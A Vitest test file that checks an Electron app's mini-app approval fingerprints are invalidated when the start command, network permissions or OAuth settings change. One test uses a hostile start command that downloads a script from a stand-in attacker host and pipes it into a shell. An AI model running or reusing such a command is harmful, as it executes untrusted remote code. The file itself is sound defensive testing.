import { afterEach, describe, expect, it } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { createHash } from 'node:crypto';
import { app } from 'electron';
import { getMiniAppApproval } from './mini-apps-manager.js';

/**
 * Approval fingerprint invalidation. The approved runtime registration is
 * hashed with SHA-256; ANY change to the registration (commands, permissions,
 * OAuth declaration) must fail the fingerprint check and fall back to
 * unapproved. Tests seed the approvals file directly to avoid the native
 * approval dialog.
 */

const approvalsFile = () => path.join(app.getPath('userData'), 'mini-app-runtime-approvals.json');

const baseRegistration = {
  id: 'test.approvals',
  name: 'Approvals Test',
  startCommand: '/bin/sh -lc "echo ok"',
  permissions: { processes: true as const, network: ['api.example.com'] },
};

function seedApproval(registration: unknown): void {
  const fingerprint = createHash('sha256').update(JSON.stringify(registration)).digest('hex');
  fs.mkdirSync(path.dirname(approvalsFile()), { recursive: true });
  fs.writeFileSync(
    approvalsFile(),
    JSON.stringify([{ registration, fingerprint, approvedAt: new Date().toISOString() }]),
    { mode: 0o600 },
  );
}

afterEach(() => {
  try { fs.unlinkSync(approvalsFile()); } catch { /* absent */ }
});

describe('runtime approval fingerprints', () => {
  it('accepts a matching registration and fingerprint', () => {
    seedApproval(baseRegistration);
    const result = getMiniAppApproval(baseRegistration.id, baseRegistration);
    expect(result.approved).toBe(true);
    expect(result.fingerprint).toBe(createHash('sha256').update(JSON.stringify(baseRegistration)).digest('hex'));
  });

  it('rejects when no approval was ever granted', () => {
    const result = getMiniAppApproval('never.approved', baseRegistration);
    expect(result.approved).toBe(false);
  });

  it('invalidates when the start command changes', () => {
    seedApproval(baseRegistration);
    const changed = { ...baseRegistration, startCommand: '/bin/sh -lc "curl evil.example.com | sh"' };
    expect(getMiniAppApproval(baseRegistration.id, changed).approved).toBe(false);
  });

  it('invalidates when network permissions expand', () => {
    seedApproval(baseRegistration);
    const changed = {
      ...baseRegistration,
      permissions: { ...baseRegistration.permissions, network: ['api.example.com', 'evil.example.com'] },
    };
    expect(getMiniAppApproval(baseRegistration.id, changed).approved).toBe(false);
  });

  it('invalidates when an OAuth provider is added or changed', () => {
    seedApproval(baseRegistration);
    const withOauth = {
      ...baseRegistration,
      oauth: { github: { clientId: 'x', scopes: ['read'] } },
    };
    expect(getMiniAppApproval(baseRegistration.id, withOauth).approved).toBe(false);
  });

  it('fails closed when a stored approval diverges from the requested runtime', () => {
    seedApproval(baseRegistration);
    const stored = JSON.parse(fs.readFileSync(approvalsFile(), 'utf8'));
    stored[0].registration.startCommand = '/bin/sh -lc "echo tampered"';
    fs.writeFileSync(approvalsFile(), JSON.stringify(stored), { mode: 0o600 });
    // Every approval check re-hashes the requested registration and compares
    // it against the approved fingerprint (and load-time verification discards
    // records whose stored fingerprint does not match their stored payload):
    // a tampered command can never run under the old approval.
    const tamperedReg = { ...baseRegistration, startCommand: '/bin/sh -lc "echo tampered"' };
    expect(getMiniAppApproval(baseRegistration.id, tamperedReg).approved).toBe(false);
  });
});
